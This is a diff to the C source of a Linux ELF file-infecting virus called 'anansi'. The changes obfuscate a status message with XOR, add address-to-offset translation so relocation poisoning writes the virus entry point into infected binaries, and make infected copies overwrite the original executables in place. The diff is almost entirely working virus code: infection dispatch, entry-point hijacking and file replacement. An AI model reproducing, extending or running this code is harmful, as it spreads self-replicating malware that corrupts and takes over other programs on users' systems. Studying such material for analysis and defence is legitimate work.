@@ -37,6 +37,7 @@
 //misc macros
 #define RDRAND_BIT (1 << 30)
 #define EPILOG_SIZE 30
+#define ANANSI_WORKS_MSG_LEN 13
 #define XOR_KEY 0x890c6d01
 
 typedef struct elfbin {
@@ -71,6 +72,7 @@ extern unsigned long real_start;
 
 // functions unique to anansi
 char *get_self_path();
+uint64_t get_file_offset(Elfbin *target, uint64_t addr);
 int dispatch_infection(Elfbin *target);
 void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_entry);
 bool is_already_infected(Elfbin *target);
@@ -194,8 +196,14 @@ void vx_main()
 	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
 	uint8_t *vx_start = (uint8_t *)get_rip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
 
-	char anansi_msg[] = "anansi-works\n";
-	anansi_write(STDOUT_FILENO, anansi_msg, anansi_strlen(anansi_msg));
+
+	char anansi_msg[ANANSI_WORKS_MSG_LEN];
+	char encrypted_anansi_msg[] = "`o`orh,vnsjr";
+
+	decrypt_xor(encrypted_anansi_msg, anansi_msg);
+	anansi_write(STDOUT_FILENO, anansi_msg, ANANSI_WORKS_MSG_LEN);
+	anansi_write(STDOUT_FILENO, "\n", 1);
+
 
 #ifdef DEBUG
 	anansi_printf("vx_start @ %lx\n", vx_start);
@@ -282,6 +290,21 @@ char *get_self_path()
 	return self_path_buf;
 }
 
+/*
+ * Convert the virtual addr to a file offset.
+ */
+
+uint64_t get_file_offset(Elfbin *target, uint64_t addr)
+{
+	uint64_t offset = 0;
+	Elf64_Phdr *phdr = target->phdr;
+	for(int i = 0; i < target->ehdr->e_phnum; i++) {
+		if(addr >= phdr[i].p_vaddr && addr <= phdr[i].p_vaddr + phdr[i].p_memsz)
+			offset = addr - phdr[i].p_vaddr + phdr[i].p_offset;
+	}
+	return offset;
+}
+
 int dispatch_infection(Elfbin *target)
 {
 	Elf64_Rela desired_relocation;
@@ -289,8 +312,7 @@ int dispatch_infection(Elfbin *target)
 	Elf64_Ehdr *hdr;
 	uint8_t *insertion;
 	uint64_t orig_entry;
-
-	//char filename_append[] = ".0ut";
+	int fd_out;
 
 	bool use_reloc_poison;
 
@@ -313,6 +335,7 @@ int dispatch_infection(Elfbin *target)
 		mod_reloc = (Elf64_Rela *)(target->write_only_mem + target->desired_rela_offset);
 		orig_entry = mod_reloc->r_addend;
 		mod_reloc->r_addend = target->vx_vaddr;
+		anansi_memcpy((uint8_t *)(target->write_only_mem + get_file_offset(target, mod_reloc->r_offset)), &target->vx_vaddr, 8);
 	}else {
 		hdr = (Elf64_Ehdr *)(target->write_only_mem);
 		orig_entry = hdr->e_entry; //backup original entry point
@@ -320,23 +343,12 @@ int dispatch_infection(Elfbin *target)
 	}
 
 	append_ret_2_OEP_stub(insertion, target, orig_entry);
-	size_t f_path_len = anansi_strlen(target->f_path);
-	//char *v_name = anansi_malloc(f_path_len + 5);
-	int fd_out;
-
-	//anansi_strncpy(v_name, target->f_path, f_path_len);
-	//anansi_strncpy(v_name + f_path_len, filename_append, 4);
 
 #ifdef DEBUG
 	anansi_printf("\t\t\tDeleting uninfected %s\n", target->f_path);
 #endif
 	anansi_unlink(target->f_path);
 
-/*
-#ifdef DEBUG
-	anansi_printf("\t\t\tCreating viral file %s\n", v_name);
-#endif
-*/
 	fd_out = anansi_open(target->f_path, O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IROTH);
 	if(fd_out < 0) {
 #ifdef DEBUG
@@ -349,9 +361,7 @@ int dispatch_infection(Elfbin *target)
 	anansi_printf("\t\t\tnew_size @ %lx\n", target->new_size);
 #endif
 	anansi_write(fd_out, target->write_only_mem, target->new_size);
-
 	anansi_close(fd_out);
-	//anansi_munmap(v_name, f_path_len + 5);
 	return 0;
 }
 
@@ -432,7 +442,6 @@ void pt_note_infect(Elfbin *target)
  * Checks to see if relocation poisoning/hijacking is viable, we are targeting R_X86_64_RELATIVE relocation type.
  * libc and ld-linux shared objects should not contain this type.
  */
-//TODO: Identify libraries
 bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 {
 	int p_entry;
@@ -639,13 +648,13 @@ int process_elf(Elfbin *target, int attr, int perm, uint64_t len)
 	Elf64_Phdr *phdr;
 	Elf64_Shdr *shdr;
 
-	if((fd = anansi_open(p, O_RDONLY, 0)) < 0)
+	if((fd = anansi_open(p, O_RDWR, 0)) < 0)
 		return -1;
 
 	if(anansi_stat(p, &fs) < 0)
 		return -1;
 
-	if(S_ISDIR(fs.st_mode))
+	if(S_ISDIR(fs.st_mode) && !S_ISREG(fs.st_mode))
 		return -1;
 
 	if(fs.st_size < (sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr) + sizeof(Elf64_Shdr)))
